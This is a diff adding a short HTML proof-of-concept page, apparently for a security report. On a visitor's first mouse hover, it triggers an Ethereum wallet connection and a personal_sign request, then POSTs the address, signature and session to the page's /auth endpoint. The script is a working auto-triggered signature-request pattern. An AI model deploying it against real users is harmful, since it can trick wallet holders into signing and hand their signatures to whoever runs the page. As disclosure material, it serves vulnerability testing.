@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hover Sign PoC — Auto POST</title>
+</head>
+<body>
+  <h2>Hover Sign PoC — Auto POST</h2>
+  <p><b>SAFETY:</b> Use only with a test account (no funds).</p>
+  <script>
+    async function runPoC() {
+      try {
+        console.log("[PoC] requesting accounts...");
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const address = accounts[0];
+        console.log("[PoC] connected account:", address);
+
+        const session = Date.now().toString() + Math.floor(Math.random() * 1000000);
+        console.log("[PoC] generated session:", session);
+
+        const message = `Session ID: ${session}`;
+        const signature = await window.ethereum.request({
+          method: 'personal_sign',
+          params: [message, address]
+        });
+        console.log("[PoC] signature:", signature);
+
+        // Kirim hasilnya ke server
+        const resp = await fetch("/auth", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address, signature, session })
+        });
+
+        const data = await resp.text();
+        console.log("[PoC] POST /auth response:", data);
+
+        alert(`localhost menyatakan\nAuth response:\n${JSON.stringify({ address, signature, session })}`);
+      } catch (e) {
+        console.error(e);
+        alert("Error: " + e.message);
+      }
+    }
+
+    // Jalankan otomatis setelah hover pada body (contoh event trigger)
+    document.body.addEventListener("mouseover", () => {
+      runPoC();
+    }, { once: true });
+  </script>
+</body>
+</html>
